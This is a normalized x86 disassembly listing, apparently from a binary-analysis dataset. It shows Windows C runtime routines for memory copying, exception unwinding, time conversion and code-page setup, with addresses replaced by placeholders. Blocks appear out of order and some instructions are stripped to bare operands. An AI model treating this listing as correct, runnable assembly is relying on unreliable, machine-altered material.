cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
push 0x1
pop eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp [ ebx + 0x18 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_406f4d
pop edi
pop esi
pop ebx
pop ebp
retn
sub_407176
push ebp
mov ebp esp
push ecx
push ebx
push esi
cmp [ ebp + 0xc ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0xc ]
mov ebx [ edi + 0x10 ]
mov eax esi
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] eax
jl r-xdata
mov ecx [ ebp + 0x14 ]
inc esi
mov [ ecx ] esi
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
cmp eax [ edi + 0xc ]
ja r-xdata
cmp esi 0xffffffff
jne r-xdata
call sub_40bf3d
cmp esi eax
jbe r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
lea eax [ esi + esi * 4 ]
cmp [ ebx + eax * 4 + 0x4 ] ecx
lea eax [ ebx + eax * 4 ]
jge r-xdata
call sub_40bf3d
lea eax [ esi + esi * 4 ]
pop edi
pop esi
lea eax [ ebx + eax * 4 ]
pop ebx
leave
retn
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov eax [ ebp + 0x8 ]
dec [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov eax [ ebp - 0x4 ]
sub_4071f4
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_407236
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push eax
push 0xfffffffe
push sub_407214
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_4072ca
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_407303
push esi
call sub_40870c
push [ rw-data ]
call sub_40855c
mov edx [ rw-data ]
pop ecx
mov ecx [ rw-data ]
mov esi ecx
sub esi edx
add esi 0x4
cmp eax esi
jae r-xdata
mov eax [ esp + 0x8 ]
mov [ ecx ] eax
add [ rw-data ] 0x4
mov esi eax
push edx
call sub_40855c
add eax 0x10
push eax
push [ rw-data ]
call sub_40bf93
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ rw-data ]
sub ecx [ rw-data ]
mov [ rw-data ] eax
sar ecx 0x2
lea ecx [ eax + ecx * 4 ]
mov [ rw-data ] ecx
xor esi esi
jmp r-xdata
call sub_408715
mov eax esi
pop esi
retn
sub_407393
push 0x80
call sub_406c98
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
push 0x18
call sub_406ec2
mov eax [ rw-data ]
pop ecx
sub_4073d0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_407430 ]
jmp [ ecx * 4 + jump_table_4074ac ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_407518 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_407518 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_4076b0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_4075b8 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4076b0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_407518 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_407518 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_407518 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4076b0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4076b0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4076b0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4076b0 ]
sub_407705
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push ebx
push esi
jne r-xdata
push 0x19
call sub_409fbd
mov esi [ ebp + 0x8 ]
pop ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40c0e0
pop ecx
pop ecx
jmp r-xdata
push 0x19
call sub_40a01e
mov eax [ ebp + 0xc ]
pop ecx
movzx ecx bx
sub eax ecx
neg eax
sbb eax eax
not eax
and eax esi
movzx eax bl
test [ eax + rw-data ] 0x4
je r-xdata
pop esi
pop ebx
pop ebp
retn
movzx eax bx
cmp [ ebp + 0xc ] eax
je r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
je r-xdata
inc esi
jmp r-xdata
push 0x19
call sub_40a01e
pop ecx
xor eax eax
jmp r-xdata
movzx ecx bx
movzx eax al
shl ecx 0x8
or ecx eax
cmp [ ebp + 0xc ] ecx
je r-xdata
movzx bx [ esi ]
test bx bx
je r-xdata
push 0x19
call sub_40a01e
pop ecx
lea eax [ esi - 0x1 ]
jmp r-xdata
jmp r-xdata
sub_40779c
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push esi
call sub_40c460
inc eax
push eax
call sub_406c98
pop ecx
test eax eax
pop ecx
je r-xdata
push esi
push eax
call sub_406430
pop ecx
pop ecx
pop esi
retn
sub_4077de
push esi
mov esi ecx
push 0x1b
mov [ esi ] r--data
call sub_409fbd
mov esi [ esi + 0x4 ]
pop ecx
test esi esi
je r-xdata
push 0x1b
call sub_40a01e
pop ecx
pop esi
retn
push esi
call sub_406c50
pop ecx
sub_407830
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_40786d
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x14 ]
cmp ecx 0x45
jl r-xdata
or eax 0xffffffff
cmp ecx 0x8b
jg r-xdata
mov esi [ edi + 0x10 ]
test esi esi
jl r-xdata
push ebx
mov eax esi
push 0xc
cdq
pop ebx
idiv ebx
push ebx
add ecx eax
mov eax esi
cdq
pop esi
pop ebx
idiv esi
test edx edx
mov [ edi + 0x10 ] edx
jge r-xdata
cmp esi 0xb
jle r-xdata
cmp ecx 0x45
jl r-xdata
add edx 0xc
dec ecx
mov [ edi + 0x10 ] edx
mov edx [ edi + 0x10 ]
test cl 0x3
mov eax [ edx * 4 + rw-data ]
jne r-xdata
cmp ecx 0x8b
jg r-xdata
lea edx [ ecx - 0x1 ]
imul ecx ecx 0x16d
sar edx 0x2
add eax edx
lea eax [ ecx + eax - 0x63df ]
mov ecx [ edi + 0xc ]
test eax eax
lea esi [ eax + ecx ]
jl r-xdata
cmp edx 0x1
jle r-xdata
test ecx ecx
jge r-xdata
test ecx ecx
jl r-xdata
inc eax
lea ecx [ esi + esi * 2 ]
shl ecx 0x3
test esi esi
je r-xdata
test esi esi
jge r-xdata
test esi esi
jl r-xdata
xor eax eax
mov eax ecx
cdq
idiv esi
xor edx edx
cmp eax 0x18
setne dl
mov eax edx
jmp r-xdata
jmp r-xdata
mov eax [ edi + 0x8 ]
test ecx ecx
lea esi [ eax + ecx ]
jl r-xdata
test eax eax
jne r-xdata
test eax eax
jge r-xdata
test eax eax
jl r-xdata
mov ecx esi
imul ecx ecx 0x3c
test esi esi
je r-xdata
test esi esi
jge r-xdata
test esi esi
jl r-xdata
xor eax eax
mov eax ecx
cdq
idiv esi
xor edx edx
cmp eax 0x3c
setne dl
mov eax edx
jmp r-xdata
jmp r-xdata
mov eax [ edi + 0x4 ]
test ecx ecx
lea esi [ eax + ecx ]
jl r-xdata
test eax eax
jne r-xdata
test eax eax
jge r-xdata
test eax eax
jl r-xdata
mov ecx esi
imul ecx ecx 0x3c
test esi esi
je r-xdata
test esi esi
jge r-xdata
test esi esi
jl r-xdata
xor eax eax
mov eax ecx
cdq
idiv esi
xor edx edx
cmp eax 0x3c
setne dl
mov eax edx
jmp r-xdata
jmp r-xdata
mov eax [ edi ]
test ecx ecx
lea edx [ eax + ecx ]
mov [ ebp + 0x8 ] edx
jl r-xdata
test eax eax
jne r-xdata
test eax eax
jge r-xdata
test eax eax
jl r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
test edx edx
jge r-xdata
test edx edx
jl r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_407a51
test eax eax
pop ecx
je r-xdata
call sub_40c4db
mov eax [ rw-data ]
add [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_407b5b
test eax eax
pop ecx
je r-xdata
jmp r-xdata
push 0x9
mov esi eax
mov eax [ ebp + 0x8 ]
pop ecx
[ edi ] [ esi ]
jmp r-xdata
mov ecx [ edi + 0x20 ]
test ecx ecx
jg r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ rw-data ]
add [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_407b5b
pop ecx
jmp r-xdata
jge r-xdata
cmp [ eax + 0x20 ] 0x0
jle r-xdata
sub_407a51
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
mov esi [ eax ]
xor ebx ebx
call sub_4090c1
test esi esi
mov edi eax
jge r-xdata
cmp [ edi + 0x40 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx [ edi + 0x40 ]
push 0x24
call sub_406c98
pop ecx
mov [ edi + 0x40 ] eax
test eax eax
mov ecx rw-data
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov [ ecx + 0x14 ] edx
cdq
mov edi 0x15180
idiv edi
mov edi rw-data
mov [ ecx + 0x1c ] eax
imul eax eax 0xfffeae80
add esi eax
test ebx ebx
jne r-xdata
sub esi eax
inc edx
cmp esi eax
jl r-xdata
mov eax esi
mov edi 0x7861f80
cdq
idiv edi
mov edx eax
imul edx edx 0xf879e080
add esi edx
lea edx [ eax * 4 + 0x46 ]
mov eax 0x1e13380
cmp esi eax
jl r-xdata
mov edx [ ecx + 0x1c ]
push 0x1
pop eax
lea ebx [ edi + 0x4 ]
mov edi rw-data
sub esi eax
mov eax 0x1e28500
inc edx
cmp esi eax
jl r-xdata
mov edx [ ecx + 0x1c ]
dec eax
mov [ ecx + 0x10 ] eax
push 0x7
sub edx [ edi + eax * 4 ]
mov eax [ esp + 0x14 ]
mov edi 0x15180
mov [ ecx + 0xc ] edx
mov eax [ eax ]
cdq
idiv edi
pop edi
push 0x3c
add eax 0x4
cdq
idiv edi
mov eax esi
mov edi 0xe10
mov [ ecx + 0x18 ] edx
cdq
idiv edi
pop edi
mov [ ecx + 0x8 ] eax
imul eax eax 0xfffff1f0
add esi eax
mov eax esi
cdq
idiv edi
mov [ ecx + 0x4 ] eax
imul eax eax 0x3c
sub esi eax
and [ ecx + 0x20 ] 0x0
mov [ ecx ] esi
mov eax ecx
inc eax
add ebx 0x4
jmp r-xdata
push 0x1
pop ebx
inc edx
sub esi eax
jmp r-xdata
cmp [ ebx ] edx
jge r-xdata
sub_407b5b
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x0
jge r-xdata
call sub_40c4db
mov eax [ esi ]
cmp eax 0x3f480
jle r-xdata
xor eax eax
jmp r-xdata
push esi
call sub_407a51
mov esi eax
push esi
call sub_40c790
pop ecx
test eax eax
mov eax [ esi ]
pop ecx
je r-xdata
cmp eax 0x7ffc0b7f
jge r-xdata
pop esi
pop ebp
retn
sub eax [ rw-data ]
push edi
push 0x3c
mov [ ebp + 0x8 ] eax
pop ecx
cdq
mov edi ecx
idiv edi
test edx edx
mov [ esi ] edx
jge r-xdata
sub eax [ rw-data ]
sub eax [ rw-data ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_407a51
cmp [ rw-data ] 0x0
pop ecx
mov esi eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi ecx
cdq
idiv edi
add eax [ esi + 0x4 ]
mov [ ebp + 0x8 ] eax
cdq
idiv edi
pop edi
test edx edx
mov [ esi + 0x4 ] edx
jge r-xdata
add edx ecx
mov [ esi ] edx
sub [ ebp + 0x8 ] ecx
mov eax esi
push esi
call sub_40c790
test eax eax
pop ecx
je r-xdata
mov eax [ ebp + 0x8 ]
push 0x18
cdq
idiv ecx
pop ecx
add eax [ esi + 0x8 ]
mov [ ebp + 0x8 ] eax
cdq
idiv ecx
test edx edx
mov [ esi + 0x8 ] edx
jge r-xdata
add edx 0x3c
mov [ esi + 0x4 ] edx
sub [ ebp + 0x8 ] ecx
mov eax [ rw-data ]
sub [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_407a51
mov esi eax
pop ecx
mov [ esi + 0x20 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push 0x18
cdq
pop ecx
idiv ecx
mov ecx eax
test ecx ecx
mov [ ebp + 0x8 ] ecx
jle r-xdata
add edx ecx
mov [ esi + 0x8 ] edx
sub [ ebp + 0x8 ] ecx
jge r-xdata
mov eax [ esi + 0x18 ]
push 0x7
add eax ecx
pop ecx
cdq
idiv ecx
mov [ esi + 0x18 ] edx
mov eax [ ebp + 0x8 ]
add [ esi + 0xc ] eax
mov eax [ esi + 0x18 ]
push 0x7
lea eax [ eax + ecx + 0x7 ]
pop ecx
cdq
idiv ecx
mov [ esi + 0x18 ] edx
mov eax [ ebp + 0x8 ]
add [ esi + 0xc ] eax
mov eax [ esi + 0xc ]
test eax eax
jg r-xdata
mov eax [ ebp + 0x8 ]
add [ esi + 0x1c ] eax
add eax 0x1f
dec [ esi + 0x14 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x1c ] 0x16c
mov [ esi + 0x10 ] 0xb
jmp r-xdata
sub_407cbb
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push 0x19
call sub_409fbd
push [ ebp + 0x8 ]
call sub_407e68
mov ebx eax
pop ecx
cmp ebx [ rw-data ]
pop ecx
mov [ ebp + 0x8 ] ebx
jne r-xdata
test ebx ebx
je r-xdata
xor esi esi
jmp r-xdata
call sub_407ee5
xor edx edx
mov eax rw-data
push 0x19
call sub_40a01e
pop ecx
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x4 ] 0x0
push 0x40
pop ecx
xor eax eax
mov edi rw-data
lea esi [ edx + edx * 2 ]
[ edi ]
shl esi 0x4
stosb [ edi ]
lea ebx [ esi + rw-data ]
add eax 0x30
inc edx
cmp eax rw-data
jl r-xdata
inc [ ebp - 0x4 ]
add ebx 0x8
cmp [ ebp - 0x4 ] 0x4
jb r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
cmp [ eax ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
push 0x1
pop esi
cmp eax esi
jne r-xdata
cmp [ ebx ] 0x0
mov ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] 0x1
push eax
mov [ rw-data ] eax
call sub_407eb2
lea esi [ esi + rw-data ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
mov [ rw-data ] eax
movsd [ edi ] [ esi ]
jmp r-xdata
movzx eax [ ecx ]
movzx edi dl
cmp eax edi
ja r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x40
and [ rw-data ] 0x0
pop ecx
xor eax eax
mov edi rw-data
cmp [ ebp - 0x18 ] esi
[ edi ]
stosb [ edi ]
mov [ rw-data ] ebx
jbe r-xdata
call sub_407f0e
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + rw-data ]
or esi 0xffffffff
and [ rw-data ] 0x0
cmp [ ebp - 0x12 ] 0x0
je r-xdata
or [ eax + rw-data ] dl
inc eax
cmp eax edi
jbe r-xdata
mov eax esi
lea ecx [ ebp - 0x11 ]
or [ eax + rw-data ] 0x8
inc eax
cmp eax 0xff
jb r-xdata
push ebx
call sub_407eb2
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] esi
jmp r-xdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
xor eax eax
mov edi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne r-xdata
or [ eax + rw-data ] 0x4
inc eax
jmp r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
cmp eax edx
ja r-xdata
sub_407e68
mov eax [ esp + 0x4 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetOEMCP@IAT ]
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetACP@IAT ]
retn
mov eax [ rw-data ]
mov [ rw-data ] 0x1
sub_407eb2
mov eax [ esp + 0x4 ]
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_407ee5
push edi
push 0x40
pop ecx
xor eax eax
mov edi rw-data
[ edi ]
stosb [ edi ]
xor eax eax
mov edi rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_407f0e
push ebp
mov ebp esp
sub esp 0x514
lea eax [ ebp - 0x14 ]
push esi
push eax
push [ rw-data ]
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
mov esi 0x100
xor eax eax
mov esi 0x100
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
mov [ ebp + eax - 0x114 ] al
inc eax
cmp eax esi
jb r-xdata
mov al [ ebp - 0xe ]
mov [ ebp - 0x114 ] 0x20
test al al
je r-xdata
and [ eax + rw-data ] 0x0
cmp eax 0x7a
ja r-xdata
or [ eax + rw-data ] 0x10
mov cl al
add cl 0x20
push 0x0
lea eax [ ebp - 0x514 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x1
call sub_40ca9d
push 0x0
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push esi
push [ rw-data ]
call sub_40c1da
push 0x0
lea eax [ ebp - 0x314 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x200
push [ rw-data ]
call sub_40c1da
add esp 0x5c
xor eax eax
lea ecx [ ebp - 0x514 ]
push ebx
push edi
lea edx [ ebp - 0xd ]
cmp eax 0x41
jb r-xdata
pop esi
leave
retn
or [ eax + rw-data ] 0x20
mov cl al
sub cl 0x20
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
test dl 0x2
je r-xdata
or [ eax + rw-data ] 0x10
mov dl [ ebp + eax - 0x214 ]
inc edx
inc edx
mov al [ edx - 0x1 ]
test al al
jne r-xdata
sub ecx eax
lea edi [ ebp + eax - 0x114 ]
inc ecx
mov eax 0x20202020
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rw-data ] cl
jmp r-xdata
and [ eax + rw-data ] 0x0
or [ eax + rw-data ] 0x20
mov dl [ ebp + eax - 0x314 ]
jmp r-xdata
inc eax
inc ecx
inc ecx
cmp eax esi
jb r-xdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja r-xdata
pop edi
pop ebx
mov dx [ ecx ]
test dl 0x1
je r-xdata
jmp r-xdata
mov [ eax + rw-data ] dl
jmp r-xdata
sub_4080af
push esi
call sub_40812b
mov ecx [ esp + 0x8 ]
xor esi esi
mov [ eax ] ecx
mov eax rw-data
call sub_408122
mov ecx [ esi * 8 + rw-data ]
pop esi
mov [ eax ] ecx
retn
add eax 0x8
inc esi
cmp eax rw-data
jl r-xdata
cmp ecx [ eax ]
je r-xdata
cmp ecx 0x13
jb r-xdata
cmp ecx 0xbc
jb r-xdata
cmp ecx 0x24
ja r-xdata
call sub_408122
mov [ eax ] 0x16
pop esi
retn
cmp ecx 0xca
ja r-xdata
call sub_408122
mov [ eax ] 0xd
pop esi
retn
call sub_408122
mov [ eax ] 0x8
pop esi
retn
sub_408134
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
pop edi
pop esi
leave
retn 0x8
sub_408170
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_4081d0 ]
jmp [ ecx * 4 + jump_table_40824c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4082b8 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4082b8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_408450 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_408358 ]
neg ecx
